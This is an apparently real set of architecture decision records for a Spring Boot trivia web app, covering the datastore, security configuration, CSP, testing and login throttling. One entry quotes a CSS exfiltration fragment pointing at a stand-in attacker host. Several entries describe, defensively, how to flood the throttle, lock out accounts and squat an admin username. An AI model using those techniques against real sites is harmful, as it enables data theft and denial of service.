# Decisions

Short records of the choices behind [ARCHITECTURE.md](ARCHITECTURE.md), kept so the reasoning
outlives the person who had it. Each says the situation, the choice, what it costs, and what would
make it wrong.

---

## 1. A relational database replaces the file adapters as the datastore

**Status:** accepted

**Context.** `Database` reads and writes `ArrayList<String[]>` against files in
`~/.trivial-trivia/`. Every read of the users file is a full scan and a string compare. There is no
transaction, no constraint, no concurrent-write story beyond hoping, and the production instance
has no disk at all, so accounts are destroyed on every restart. Issue #46 has tracked this since
before 1.0.

**Decision.** Users, questions, rounds and per-answer records live in a relational database
reached through repositories. The file adapters stay, in a different role (3).

**Consequences.** Constraints, indexes and transactions become available, which the timer and the
leaderboard both need. `Questions`, `Login`, `CreateUser` and `RealUser.saveScore` all change. The
seam the `Database` interface was supposed to be turns out to have been in roughly the right
place, which is the interesting part of the story.

Revisit if the app ever has to run with no writable storage of any kind, at which point it is a
different app.

---

## 2. H2 for development, PostgreSQL for production, bound by profile

**Status:** accepted, revised after measurement

**Context.** `mvn spring-boot:run` currently needs nothing installed and that is worth keeping.
Production needs something that survives a restart. The obvious wiring is "PostgreSQL when
`DATABASE_URL` is set", because `DATABASE_URL` is the variable the host hands out.

**Measured.** Spring Boot does not bind `DATABASE_URL`. With it set to a PostgreSQL instance, the
app started on in-memory H2, ran the migrations against that, and logged nothing about the
database it had been given. Relaxed binding maps `SPRING_DATASOURCE_URL`; it does not map
`DATABASE_URL`. The failure is silent, and it looks identical to the throwaway-account behaviour
this entire milestone exists to fix, which is the worst way for it to fail.

Second trap in the same path: what the host hands out is `postgres://user:pass@host/db`, which is
not a JDBC URL. Spring rejects it with `'url' must start with "jdbc"`. Something has to translate
it, and that something should be visible rather than assumed.

**Decision.** Two profiles. Development binds a file-based H2 under the data directory, so a fresh
clone still needs nothing installed and a local account now survives a restart. Production carries
no default datasource URL at all: if `SPRING_DATASOURCE_URL` is absent the context fails to start.
Fail closed and loudly, rather than fall back to a database that evaporates.

One set of Flyway migrations in the SQL both understand, with H2 in `MODE=PostgreSQL`.

**Consequences.** A misconfigured deploy becomes a red deploy instead of a green one that quietly
loses every account. The `postgres://` to JDBC translation happens in one named place.

Two dialects still have to keep working, and H2's PostgreSQL mode is an approximation, so anything
vendor-specific is off the table: no `JSONB`, no PostgreSQL-only `ON CONFLICT` clauses, no
window-function edge cases. The schema stays boring, which it should be anyway.

The gap this leaves is that the whole test suite runs on H2 and production runs on something else.
A second CI job against a PostgreSQL service container closes it for the cost of one job and no
runtime weight. Testcontainers would close it locally too but wants Docker on every machine and
adds most of a minute per run, so it is the fallback, not the first move.

Revisit if a feature genuinely needs a PostgreSQL-specific type, or if the free database tier turns
out to expire, in which case the development default has to be honest about what happens when it
lapses.

---

## 3. The CSV, JSON and XML adapters become an import/export format layer

**Status:** accepted

**Context.** `CSVAdapter`, `JSONAdapter` and `XMLAdapter` are a good Adapter implementation
pointed at the wrong job. They are not a database; they are three renderings of a table of
strings. The one thing they are genuinely good at is the feature the README advertises: export the
question set in three formats, import it back in any of them.

**Decision.** Keep all three, keep the extension dispatch, delete the pretence that they are
storage. The interface changes from file paths to streams:

```java
List<String[]> read(InputStream in);
void write(OutputStream out, List<String[]> rows);
```

**Consequences.** Export stops writing a scratch file into the data directory and streams the
bytes it just built, which removes the UUID-collision workaround in `QuestionsController` and the
dependency on a writable directory the production instance does not have. Import parses the upload
stream directly and only touches the database once the rows validate.

`CSVAdapterTest` and `FormatAdapterTest` need reworking for the new signatures.
`theXmlParserDoesNotResolveExternalEntities` is unaffected and stays exactly as written. It
guards a live boundary: these still parse files a stranger uploaded.

Revisit if a format ever needs streaming for size. At a few kilobytes a question set, it does not.

---

## 4. `JdbcClient` and hand-written repositories, not JPA

**Status:** accepted

**Context.** The obvious move is `spring-boot-starter-data-jpa`, because that is what most Java
job descriptions list. The domain here is five tables with no object graph deeper than one level,
and the deployment target is a tenth of a CPU where the entire performance story so far has been
about shaving seconds off boot.

**Measured**, against the current artifact: `spring-boot-starter-data-jpa` costs +26.3 MB RSS,
+16.1 MB metaspace, +4.25 s startup and +29.1 MB of artifact. `spring-boot-starter-jdbc` costs
+2.6 MB RSS and +0.25 s. On an instance with 512 MB and a tenth of a CPU, where nearly every
visitor arrives during a cold start, that is a seventeenfold difference in startup cost for the
same five tables.

**Decision.** `spring-boot-starter-jdbc` and `JdbcClient`, with a repository class per aggregate
and explicit SQL.

**Consequences.** Hibernate's bootstrap is the largest single thing that could be added to the
startup path, and it would be added to buy lazy loading, dirty checking and a first-level cache
that nothing here uses. Skipping it also skips the failure modes: no N+1, no detached-entity
surprise, no `LazyInitializationException` rendering a JSP.

The cost is real and worth stating: more code, and SQL strings where a typo in a column name is a
runtime error rather than a compile error. The mitigation is an integration test per repository,
which the coverage floor pushes toward anyway.

This is a judgment call, not a rule. JPA earns its keep with deep aggregates, multiple entities in
one transaction, and optimistic locking spread across a graph. If two of those three turn up, the
decision changes. Spring Data JDBC is the intermediate step before Hibernate, not after it.

---

## 5. The migrator off the legacy CSV files is development-only

**Status:** accepted, scope reduced after measurement

**Context.** Anyone running 1.0 locally has real accounts and real score history in
`userData.csv` and `StatData.csv`. Shipping 2.0 with a new datastore and no migration silently
loses them.

The hosted instance has none of that, and cannot. It has no disk, and `DataDirectory` does not
seed those two files from the classpath the way it seeds the questions; it creates them empty on
every boot. There has never been a production row to migrate and there is no way for one to
appear. The population this serves is a couple of developer machines.

**Decision.** The migrator is a development-profile bean. If the users table is empty and the
legacy files exist, it reads them through the CSV adapter and inserts them, including stats and a
locally-imported question set that differs from the shipped one. Password hashes copy across
untouched; they are already BCrypt.

Under the production profile the bean does not exist. No startup cost, no branch to reason about,
nothing to audit, and no way for a path that has never had real input to be reached by a stranger.

It is deleted in 2.1.

**Consequences.** Shipping a permanent production code path to serve two laptops was the wrong
trade, and the profile gate is what makes the scope honest: this is a developer convenience, so it
lives where developers are.

The version number matters more than it looks. "Once nobody is upgrading from 1.0" is how a
temporary path becomes a permanent one, because nobody can ever prove the condition. A release
number can be checked off.

The condition is "users table is empty", with no marker file. A fresh database next to old CSVs
re-imports, which is the behaviour anyone would want, and a database with users in it is never
touched, which is the behaviour that matters. The legacy files are left where they are rather than
deleted, so a failed upgrade is recoverable by rolling back the binary.

The adapters' first job in their new role is migrating off themselves, which is a fair test of
whether the seam was where it looked like it was. That holds whichever profile it runs under.

---

## 6. Adopt Spring Security, and keep every public route public

**Status:** accepted, and supersedes the comment in `pom.xml`

**Context.** The pom explains why only `spring-security-crypto` is present: the full starter
"would put a login wall in front of every route, which is not what this app does". That was a
correct reading of the auto-configured default and an incorrect reading of the starter. Meanwhile
there is no CSRF protection on any form, no session fixation handling at sign-in, no roles, and
`ProxyUser` is a hand-rolled security context that has already been the subject of two fixed bugs
(#61, #62).

**Decision.** Add `spring-boot-starter-security` with one explicit `SecurityFilterChain`. The
default `anyRequest().authenticated()` only applies when no chain is defined; defining one replaces
it entirely. The landing page, the menu, the whole game loop, the questions page and export stay
`permitAll`. Sign-in, registration and the guest path stay reachable to anyone. Only the score
history, the import endpoint, the writing half of the API and the non-health actuator endpoints
require authentication.

Guest play stops being a special case and becomes anonymous authentication, which is precisely
what `ProxyUser` with a null user modelled by hand. `ProxyUser` is replaced by a singleton
adapter over `SecurityContextHolder`; the `CurrentPlayer` interface it implements survives,
because four controllers and several views already speak it.

**Consequences.** CSRF tokens go into every form. Session fixation protection and a correct
sign-out become framework behaviour, replacing `session.invalidate()` in a controller.
`LoginController.signIn` and `AccountController.logout` are deleted; `/loginMenu` and
`/loginServlet` stay as the login page and processing URL so no bookmark or test breaks on the
path.

Cookie flags are not in that list, and it is worth being exact about why. `HttpOnly` on
`JSESSIONID` is Tomcat's default, not Spring Security's. `SameSite` is nobody's default: the
container does not set it and the security starter does not add it. The header observed on the
running application was `Set-Cookie: JSESSIONID=...; Path=/; HttpOnly`, with no `SameSite` and no
`Secure`. Both come from properties the application sets for itself,
`server.servlet.session.cookie.same-site=lax` and `secure=true`, and `secure=true` belongs under
the production profile only, since a secure cookie over plain HTTP locally is a cookie the browser
never sends back.

The general form is worth carrying into the rest of this file: "the framework handles it" and "the
framework can be configured to handle it" are different claims, and only one of them survives
reading the response headers.

Sign-out becomes a POST, because a GET that ends your session is something any page can trigger.
That is a small JSP change and a correct one.

The `PasswordEncoder` bean stays an explicit `BCryptPasswordEncoder`. Spring's default
`DelegatingPasswordEncoder` expects an `{id}` prefix on every hash and every stored hash here
lacks one, so installing it would break every existing password at once.

That adapter is a plain singleton, and the reason is worth writing down because "why is this not
request-scoped?" is the first question anyone reading it will ask. `SecurityContextHolder` is a
`ThreadLocal` that the filter chain fills and clears around each request, so a singleton reading it
on every call is already per-request-correct. Request scope would add a CGLIB proxy to buy nothing,
and it would be worse than nothing: a scoped bean resolves once and holds what it resolved, and
registration signs a new account in halfway through a request. The old `ProxyUser` needed session
scope because it held the state itself. This one holds none, which is what makes the scope question
go away rather than needing an answer.

The README's claim that the Proxy pattern is one of three patterns that survived needs rewriting
rather than deleting. The proxy is still there; it now stands in front of the framework's context
instead of a mutable field.

Revisit if the app ever needs to be genuinely stateless across instances, at which point form
login and server-side sessions are the wrong shape and it becomes a token discussion.

---

## 7. DTOs are separate records, mapped by hand

**Status:** accepted

**Context.** The API needs a response shape. Returning persistence types directly is the fast path
and the one that turns a column rename into a breaking API change, or leaks a password hash the
first time someone adds a field.

**Decision.** `api/v1/dto` holds records with their own field names and a static `from(...)`
factory each. Nothing from `persistence/` appears in a response body.

**Consequences.** Some duplication between a row record and a DTO record, which is the point: the
duplication is the API contract. No mapping library: MapStruct is an annotation processor and a
build-time dependency for a handful of one-line conversions, and a hand-written `from` is easier
to read than a generated one is to find.

Revisit if the mapping count gets past what one file can hold comfortably. Ten records is not that.

---

## 8. CSRF stays on for the API

**Status:** accepted

**Context.** The standard move when adding an API to a Spring Security app is
`csrf.ignoringRequestMatchers("/api/**")`. That is correct when the API is authenticated by a
bearer token and wrong when it is authenticated by a session cookie.

**Decision.** This API is authenticated by the same session cookie as the pages, so CSRF stays on
for it. The token is exposed through a cookie repository the page's JavaScript can read, with the
Spring Security 6 request handler that keeps BREACH protection working. Safe methods are exempt by
method, as always, so read-only endpoints need nothing.

**Consequences.** A little more work in the page script than disabling it. Anything else would mean
that a form post to `/api/v1/rounds` bypasses the protection the form post to `/play/answer` has,
which is not a protected app.

Revisit if the API ever gets a token-authenticated path for non-browser clients. Then that path,
and only that path, is exempt.

---

## 9. `GameService` stops being session-scoped

**Status:** accepted

**Context.** `GameService` is `@SessionScope` and holds the round: the question list, the cursor,
the score, the counters. It became session-scoped to fix #61, where a singleton meant two players
shared one score. That fix was right and the scope is now the thing in the way. An in-flight
round lives only in memory, so a restart loses it, the server cannot prove when a question was
served, and a multiplayer room is not a session and cannot reach it.

**Decision.** At M4, when the timer arrives, it becomes a stateless singleton `RoundService` that
takes a round id. The session holds the id and nothing else. Round state lives in `rounds` and
`round_questions`.

**Consequences.** One scoring implementation with three callers: the JSP controllers, the API, and
a multiplayer room. That is enough callers to justify the extraction; with one it would not have
been.

`PlayControllerTest.twoSessionsKeepSeparateScores` is named in the README as a guard against #61
coming back. It must be re-expressed as "two sessions hold two different round ids", not deleted.
The bug it guards against is still possible, just in a new dialect.

Not done at M1, deliberately. M1 is already a datastore change; moving the round out of the session
in the same milestone makes both harder to review.

---

## 10. A multiplayer room lives in memory and is never persisted

**Status:** accepted

**Context.** M5 wants rooms with a join code, synchronised reveals and a live scoreboard. The
instinct is to give rooms a table.

**Decision.** Room state — the code, the player list, the cursor, the live scoreboard — lives in a
`ConcurrentHashMap` in a singleton registry, with a cap on rooms and on players per room, and a
scheduled reaper for idle ones. The broker is Spring's simple in-JVM broker. Only the outcome is
persisted: at the end of a room's game each player's round is written to `rounds` and
`round_questions` like any solo round.

**Consequences.** A restart ends every live room, and that is the correct behaviour, not a
limitation to work around. A room that survived a restart would have no live sockets and no
players still watching; restoring it would produce a room that exists and cannot be played. The
leaderboard cannot tell a multiplayer round from a solo one, which is what makes the whole thing
one game rather than two.

The caps are a boundary, not tidiness. 512MB and an unbounded room-creation endpoint is a denial
of service that takes one loop to write.

The real limitation belongs in the README, not in a comment: an instance that sleeps after fifteen
idle minutes cannot host a reliable synchronous multiplayer game. Two players arriving cold wait
out the boot together, and a mid-game recycle ends the game. This is worth building anyway,
because the design is the interesting part and the constraint is the reason the design is what it
is. It is not worth pretending about.

Revisit the moment there is more than one instance. Then the registry needs an external broker and
a shared store, and that is a real rewrite of this milestone, not an extension of it.

---

## 11. Correlation ids from an MDC filter, not a tracing library

**Status:** accepted

**Context.** M6 asks for structured logs with correlation ids. The reflexive answer is Micrometer
Tracing plus a Brave or OpenTelemetry bridge.

**Decision.** Structured output uses Boot's own `logging.structured.format.console`, built in since
3.4, so no encoder dependency. The correlation id is a `OncePerRequestFilter` that reads
`X-Request-Id` or generates one, puts it in the MDC, and clears it in a `finally`.

**Consequences.** About fifteen lines and no dependency, against a tracing stack that costs real
boot time. There is one service here. Distributed tracing traces distribution; with nothing to
propagate to, what is left is a request id in every log line, which is exactly what the filter
does.

The `finally` is not optional. Thread pools reuse threads, and an MDC entry that outlives its
request attaches one request's id to another's logs, which is worse than having none.

Revisit if a second service ever appears. Then the filter becomes the thing being replaced, and
the header name it already reads is the migration path.

---

## 12. Boot time and resident memory are budgets every dependency is charged against

**Status:** accepted

**Context.** A free instance sleeps after fifteen idle minutes, so most visitors arrive during a
cold start on a tenth of a CPU. Two changes already exist purely for this: the JSPs are compiled
by Maven rather than by Jasper on first request, and the JIT is capped at tier one. Seven
milestones of dependencies would undo both without anyone noticing which one did it.

**Decision.** Each milestone records the `Started Main in Xs` line and the resident set before and
after. A dependency that moves either one has to be worth what it moved, in writing, with the
number next to it.

**Consequences.** The budget has already thrown three things out on measurement rather than
taste: JPA [4], springdoc [15] and the Prometheus registry [16]. Hibernate Validator stays despite
its bootstrap cost, because validating what a client sends is not something to trade away for boot
time. That is the line the budget does not get to cross.

This budget is also the answer to a question an interview will ask about every one of these
decisions, which is a reason to keep the numbers rather than the impressions.

---

## 13. What is deliberately not being done

**Status:** accepted

- **No SPA, no JavaScript build step.** JSP with server-side rendering is the honest description
  of this stack. Replacing it would replace the part of the project that is specific to it with
  the part every other project has.
- **No microservices.** One deployable, one database, one process. There is no second team and no
  scaling axis that a split would help.
- **No Kotlin.** The existing code is Java 17 and there is no second language's worth of benefit
  here.
- **No Redis, no external broker, no external session store.** All three exist to coordinate
  between instances. There is one instance.
- **No Lombok.** Records cover most of what it would be used for, and it is a compiler plugin in
  exchange for some getters.
- **No ArchUnit yet.** The layering rules in ARCHITECTURE.md are enforced by review. ArchUnit is
  test-scope so it costs no boot time, and it is the right answer the first time a violation
  actually merges. Not before.
- **No API documentation UI in the running app.** The document is generated at build time and
  published as a static file [15].
- **No metrics registry, and no metrics endpoint** [16].
- **No password reset.** It needs an email sender, a token table and a delivery service, and the
  hosted instance wipes itself anyway. It is a real gap and it should stay listed as one rather
  than half-built.
- **No admin UI beyond what a role gate gives.** `ROLE_ADMIN` exists so the actuator endpoints and
  question management have somewhere to hide. A CRUD screen for questions is a feature, not
  architecture, and the import path already does the job.
- **No retention or archival policy.** Rounds accumulate. At ten questions a round, they will
  accumulate slowly enough to deal with later, and the note in ARCHITECTURE.md says what "later"
  looks like.

---

## 14. Migrations are expand and contract, because a rollback comes up green

**Status:** accepted

**Context.** The comfortable assumption about Flyway is that it makes a deployment one-way, so a
rollback will be caught. It does not, and it will not.

**Measured.** An old build booted clean against a schema ahead of it, reporting `Current version:
2` and starting normally, because `ignoreMigrationPatterns` defaults to `[*:future]`. Flyway sees
a migration it does not know about, shrugs, and carries on.

**Decision.** Every migration is additive. Columns and tables are added in the release that starts
writing them, and nothing is dropped or renamed in the same release as the code change. A drop
ships one release after the code that stopped using the column, once there is no version left that
could roll back onto it.

**Consequences.** This makes rollback more dangerous than the assumption suggested, not less. A
rollback onto a destructive migration starts clean, passes the health check, goes live, and then
fails under a user on the first request that touches the missing column. Nothing in the deploy
pipeline gets a chance to notice, which is why the rule has to hold when the migration is written
rather than when it is deployed.

The cost is a dead column living for one extra release, and a second migration to remember. That
is cheap, and the alternative is a rollback that looks like it worked.

Revisit only if this ever gains a deployment model that can pin schema and code together, which
one instance and a git push does not.

---

## 15. The OpenAPI document is generated at build time, not served by the app

**Status:** accepted

**Context.** M3 wants an OpenAPI document and a browsable reference. The standard answer is
`springdoc-openapi-starter-webmvc-ui`, which scans the controllers at startup and serves Swagger
UI out of the running app.

**Measured.** +12.4 MB RSS and +6.7 MB of artifact, paid on every cold start, for a document that
cannot change between deploys.

**Decision.** Generate the OpenAPI JSON during the build and publish it next to the Pages demo,
which is already a static site with a workflow that generates a file from the question set. The
running instance ships neither the generator nor the UI.

**Consequences.** The API still has a reference anyone can read, and it is version-controlled and
diffable, which a document rendered from a live process is not. The cost is that it can drift from
the code if the generation step is skipped, so it runs in CI, where a stale document is a failed
build rather than a wrong page.

What is genuinely lost is the "try it out" button against the live instance. On an instance that
sleeps after fifteen idle minutes, that button was going to spend most of its life timing out.

Revisit if the API ever gets external consumers who need to explore it interactively, at which
point the UI is worth its megabytes.

---

## 16. No metrics registry

**Status:** accepted

**Context.** M6 asks for Micrometer with a Prometheus registry, which is what an observability
milestone is normally made of.

**Measured.** +14.8 MB RSS on a 512 MB instance, to expose a scrape endpoint that nothing scrapes.
There is no Prometheus deployed and there could not usefully be one: the instance is asleep for
most of every hour, so a scraper would either wake it continuously or collect gaps.

**Decision.** Actuator for health and liveness, and no registry. What is kept is the part that
works on one sleeping instance: structured logs with a correlation id [11], and probes the host
actually calls.

**Consequences.** Observability here means logs and health, and the README should say so rather
than implying a dashboard exists. Claiming metrics nobody collects is worse than not having them,
because it is exactly the claim an interview asks a follow-up question about.

Revisit the moment there is somewhere to send them. The registry is one dependency and a property
away, and none of the application code changes.

---

## 17. Pin the garbage collector rather than trust ergonomics

**Status:** accepted

**Context.** The JVM picks a collector and a heap ceiling from how many processors and how much
memory it believes it has. The container is 512 MB with a fraction of a CPU, and hosts throttle CPU
in two different ways: a hard quota, which the JVM reads as one processor, or shares, which it
reads as the whole machine.

**Measured.** Identical flags, different apparent CPU counts: one processor gives SerialGC and
186 MB RSS, four gives G1 and 228.6 MB. The difference is not the collector being wrong, it is
G1's region and thread overhead on a machine with neither the cores nor the headroom for it.

**Decision.** `-XX:+UseSerialGC` in the `Dockerfile`, explicitly, next to the tier-one JIT cap
that is already there for the same reason.

**Consequences.** A single-threaded collector on a fraction of a CPU is the right shape anyway:
there are no spare cores for a concurrent collector to run on. Pause times get worse under load
this instance will never see.

The real win is that the container behaves the same whichever way the host throttles, instead of
quietly picking a heavier configuration and drifting toward a ceiling it cannot afford.

Revisit if this ever runs somewhere with real cores and real memory, where G1 earns its overhead.

---

## 18. The end page shows the last answer's verdict through a forwarded flash map

**Status:** accepted

**Context.** `POST /play/answer` flashes the verdict for the answer just given and redirects to
`/play/question`, which renders it above the next question. On the last answer of a round that
redirect is a staging post: `/play/question` has nothing left to hand out and bounces straight to
`/play/end`, and a flash attribute does not survive a second redirect. So the verdict on the tenth
answer was the one nobody ever saw.

**Decision.** `getQuestion` re-flashes its own input flash map onto the redirect to `/play/end`,
rather than `submitAnswer` special-casing the last question.

**Consequences.** The scoring path stays ignorant of where it sits in the round, which is what
keeps `submitAnswer` a method that only compares an answer to a question. The alternative, having
the POST know whether it just answered the last one, puts round-position logic in the one place
that should not have any.

The cost is that it forwards the whole map, not the two keys it means. Any future flash attribute
aimed at `/play/question` will also arrive at `/play/end`. Narrow it to `answerCorrect` and
`correctAnswer` the first time something else flashes there. Until then, naming the two keys is a
list to keep in sync for no benefit.

---

## 19. A JSP app cannot verify its security configuration through MockMvc

**Status:** accepted

**Context.** M2 shipped with 210 green tests and a completely broken application. Every page
answered 302 to `/loginMenu`, and so did `/loginMenu`, so a browser followed the redirect until it
gave up. That included `/`, which is the host's health check, so the deploy would never have gone
live.

The cause is one default. Spring Boot 3 registers the security filter for every servlet
dispatcher type, and the documented default of `spring.security.filter.dispatcher-types` is
`async, error, forward, include, request`. Rendering a JSP view is a FORWARD to
`/WEB-INF/views/*.jsp`, a path no authorization rule permits, because it is not a URL anyone
requests. So with an explicit `SecurityFilterChain` in place, authorisation ran a second time on
the forward and denied what it had already passed on the request.

**The part worth recording is why every test was green.** MockMvc does not perform a forward; it
records that one was requested and asserts on the recorded name. No second dispatch happens, so
the security filter never runs a second time, so the entire MockMvc suite is structurally
incapable of seeing this failure. It is not a gap in test coverage. It is a gap in what that test
tool observes, and no number of additional MockMvc tests would close it.

**Decision.** Two things, and the second is the durable one.

The property is narrowed to `request,error,async`, which is what Boot 2 defaulted to. Nothing is
given up by narrowing it. Authorization has already run on the REQUEST dispatch by the time the
view renders, and a client cannot originate a FORWARD.

The test boundary moves. A test class boots real Tomcat on a random port and fetches pages over
HTTP, so forwards actually happen and the filter chain sees what it will see in production. Every
route that renders a view has a case in it, `/` first, because that is what the host polls. The
rule that follows: **a change to security configuration is verified through the real-container
test, not through MockMvc.**

Measured, with the test class in place and the property reverted to Boot's default:

```
Boot default dispatcher-types : Tests run: 11, Failures: 8, Errors: 3  BUILD FAILURE
as shipped                    : Tests run: 11, Failures: 0, Errors: 0  BUILD SUCCESS
```

**Consequences.** A real container is slower than MockMvc, so this is a small class covering the
rendered pages and the CSRF token, not a second copy of the suite. MockMvc keeps everything it is
good at: which handler ran, what went into the model, where a redirect pointed. The boundary is
now legible. MockMvc tests what the controller decided, and the container test covers what the
container does with that decision.

The generalisable version, which is the reason this is an ADR and not a comment in a properties
file: a test tool that simulates part of the stack cannot find bugs in the part it simulates. JSP
rendering is a servlet forward, forwards are a container behaviour, and MockMvc's forward is a
recording. The same blind spot covers anything that depends on the FORWARD dispatch or on a view
actually rendering, not just this one property. It is also one of three times this milestone that a
green result meant nothing, which is its own decision [22].

Revisit when views stop being forwards. An API that returns a body has no second dispatch and none
of this applies to it. That is also the day the JSP goes, so not soon.

---

## 20. `round_questions` is deferred to M4, with its foreign key still open

**Status:** deferred, forced at M4

**Context.** M1 shipped `users`, `categories`, `questions` and `rounds`, and not
`round_questions`. That was a choice, not an oversight, and it deserves recording so it does not
read as one.

The open question is what `round_questions.question_id` does when the question it points at goes
away, and an import replaces the entire question set, so questions go away routinely. Three
options, none of them free:

- `ON DELETE CASCADE` quietly deletes a player's answer history the next time anyone imports.
- `ON DELETE SET NULL` keeps the history and loses which question was asked, which is most of what
  the history was for.
- `RESTRICT` keeps the history intact and makes import fail as soon as anybody has played, which
  breaks a feature the README advertises.

The way out is probably versioning: an import adds a new generation of questions rather than
replacing rows, and old answers keep pointing at the generation they were asked from. That is a
schema decision with real weight, and M4 is where it belongs, because M4 designs the timer and
needs `served_at` in the same table. Deciding it now would mean deciding it with less information
than the person implementing it will have.

**Decision.** Defer. M1 stores the round-level score, which is all the score history and the
leaderboard need. M4 adds the table and picks the policy in the same slice.

**Consequences.** Nothing in M1 is shaped around a table that does not exist yet, and expand and
contract [14] makes the deferral cheap: adding `round_questions` later is purely additive, with no
backfill and no rewrite of a shipped migration.

The deadline is not soft. A server-authoritative per-question timer cannot exist without a durable
`served_at` per question, so M4 cannot start without settling this. That is the forcing function,
and it is better than a note in a backlog.

---

## 21. `style-src` keeps `'unsafe-inline'`, and `script-src` does not

**Status:** accepted

**Context.** The policy that shipped:

```
default-src 'self'; script-src 'self' 'nonce-<per-response>';
style-src 'self' 'unsafe-inline'; style-src-elem 'self';
object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'
```

`script-src` carries a fresh nonce per response and no `'unsafe-inline'`, and a test asserts both,
so the easy fix for the next inline script cannot be applied without someone noticing.

`style-src` is the exception. Three views compute a percentage into a `style=` attribute: the
question progress bar, the result ring on the end page, and the bars on the stats page. A nonce
cannot cover a style attribute, because nonces apply to `<style>` elements and `<link>` and not to
attributes, and the values change per request, so a hash cannot cover them either.

That much is CSP. What follows from it is a choice, and there was a way out that was not taken.
All three values are already integers by the time they reach the attribute, so precomputed classes
would remove the attributes entirely: twenty-one classes at five percent granularity, or a hundred
and one at one percent. With the shipped ten-question set the round progress bar only ever shows
multiples of ten, so it does not even need the fine version. Two of the three are progress bars
and could be a native `<progress value max>`, which carries no inline style at all. Either route
ends at `style-src 'self'` with no concession in the policy.

**Decision.** Keep `'unsafe-inline'` in `style-src` for now, put `style-src-elem 'self'` next to
it, and hold the `script-src` line absolutely.

**Consequences.** This is a trade with a price, not a necessity, and the price is worth naming.
What `'unsafe-inline'` on styles exposes is defacement. An injected style can restyle the page and
cannot get anything out, because `default-src 'self'` leaves CSS nowhere to send it. The
attribute-selector exfiltration trick, where a selector matches on a value and leaks it through
`background: url(https://attacker/...)`, dies at `default-src`, not at `style-src`. So the
concession is three views and a stylesheet's worth of churn, weighed against a weakening whose
worst case is a page that looks wrong.

`style-src-elem 'self'` buys back the `<style>` element half of the directive in browsers that
implement it. Browsers that do not fall back to `style-src`, so an unfamiliar directive degrades
toward a working page rather than a broken one, which is the right direction for a policy that has
to hold on browsers nobody tested.

The asymmetry is the whole point. Script injection is code execution. Style injection is
defacement with no channel out. Spending the one concession on the directive that cannot execute
is the trade, made on purpose.

Reverse it whenever those three percentages are worth moving, which is a small change nobody has
needed yet: precompute the classes, or use `<progress>` where it fits, then drop `style-src` to
`'self'` and delete `style-src-elem`. Nothing else in the policy depends on either.

---

## 22. Prove the instrument before trusting a zero

**Status:** accepted

**Context.** The CSP work reported zero violations across eight pages, collected from headless
Chrome. That number is worth nothing on its own. A silently violated CSP renders identically to a
working one: the pre-paint theme script is blocked, the white flash comes back, and no page says
so. "No violations reported" and "the collector reports nothing" are the same output.

So before the zero was reported, the instrument was checked: a throwaway server served a
deliberately wrong nonce, and headless Chrome was confirmed to surface the violation. Only then
was a clean run across the real pages worth anything.

**Decision.** A negative result is reported together with the demonstrated sensitivity of whatever
produced it. If a check is going to be cited as evidence that something does not happen, it gets a
run where it does happen, first.

**Consequences.** This is a rule rather than an anecdote because the same shape turned up three
times in one milestone:

- An assertion that the theme toggle was `hidden` passed while the button was rendering. The
  attribute was true; the attribute was not the question.
- 210 green MockMvc tests said nothing about a security configuration that broke every page in the
  app, because MockMvc records a forward instead of performing one [19].
- A CSP with zero reported violations, from a collector nobody had shown could report one.

Every one is the same failure. An instrument answers a slightly different question from the one
being asked, answers it correctly, and gets read as an answer to the original. None of the three
was a coverage gap, and more of the same tests would have closed none of them.

The cost is one extra run per negative claim, which is small. The alternative is a green result
whose only real content is that nothing was looking.

There is nothing here to revisit. It is a habit rather than a decision, written down because
habits are the part that does not survive a handover.

---

## 23. The login throttle locks accounts, which is a denial of service by design

**Status:** accepted, with a known cost

**Context.** The throttle counts failed sign-ins per username and locks that account for fifteen
minutes after five failures. It stops password guessing, which is what it was added for.

It also means anyone who knows a username can lock its owner out with five bad posts, and keep
them out indefinitely by repeating after each window. On a public instance where usernames are
semi-guessable and a leaderboard will eventually display them, that is a real cost rather than a
theoretical one, and none of the earlier entries admitted it.

The alternatives, and what each one loses:

- **Key on IP only.** Any botnet walks through it, and it punishes shared addresses: a university
  network or a mobile carrier is one IP to the server.
- **Key on IP and username together.** Removes the cross-address lockout, so nobody can lock an
  account they do not share an address with. A distributed attacker then guesses freely, which is
  the case the throttle exists for.
- **Delay instead of deny.** Exponential backoff on the response makes guessing expensive without
  a correct password ever stopping working. This is the real answer, and it is what to build when
  the lockout becomes a problem in practice.

**Decision.** Username only, accepting the lockout as a denial of service, on an instance with no
reputation data, no address allowlist and nothing to coordinate with. Backoff is the upgrade, and
the trigger is somebody actually using the lockout as a weapon.

**The eviction rule is load-bearing.** Usernames are whatever was typed, so the map needs a
ceiling, and what happens at the ceiling decides whether the throttle works at all. The first
version refused new entries once full, which handed an attacker a way to switch the throttle off:
post ten thousand junk usernames, fill the map, and every account not already tracked stops being
counted. What ships instead evicts entries whose window has expired, and only refuses when the map
is still full of live counters. Refusing in that state keeps the counters that were actually
earned, which is the opposite of what someone flooding the map wants.

Anyone tidying that branch needs to know it is holding something up. A plain "reject when full" is
the bug, not the simplification.

**Consequences.** The lockout is reported through `isAccountNonLocked()`, which the framework
checks before the password, so a locked account costs no BCrypt work. That is a second reason the
ordering matters: hammering a locked account cannot be used to burn CPU on a tenth of one.

The counter is per instance and a restart forgives everyone, which on a free instance that sleeps
after fifteen idle minutes is close to the lockout window anyway. Both facts stop being true on
the day there are two instances, and that is the same day the map has to become a table.

---

## 24. `app.admin.username` promotes on every boot, and is the only way to become an administrator

**Status:** accepted

**Context.** There is no sign-up path to an administrator account and no screen to grant one from.
An operator sets `app.admin.username` and restarts. It exists because the hosted instance has a
dashboard for environment variables and no shell; anywhere with a database prompt, one SQL
statement does the same job.

Two properties make this the only privilege-escalation surface in the application, and both were
living in a javadoc rather than anywhere someone reviewing security would look.

It runs on every boot, not once. A free instance sleeps after fifteen idle minutes and cold-starts
on close to every visit, so "on every boot" means "more or less continuously".

And if the variable names an account that does not exist yet, that is not a harmless no-op that
logs a warning. It is a standing offer. A stranger who registers that username becomes an
administrator the next time the instance wakes, and an administrator can replace the question set
that everyone else plays.

**Decision.** A missing account stops the context, the same way a missing datasource URL does [2].
A variable naming an account that is not there is a misconfiguration, and a boot failure the
operator sees beats a silent escalation waiting for somebody to claim the name.

**Consequences.** The ordering becomes explicit and unavoidable: register the account, then set
the variable, then restart. That is one step more than "set it now and it will apply when they
sign up", and that step is the entire security property.

There is no demotion path. Pointing the variable at a different account promotes the new one and
leaves the old one an administrator. Removing the variable promotes nobody and demotes nobody.
Taking the role away is a SQL statement against the users table. That is worth fixing when there
is a second administrator worth managing, and not worth an admin screen before then.

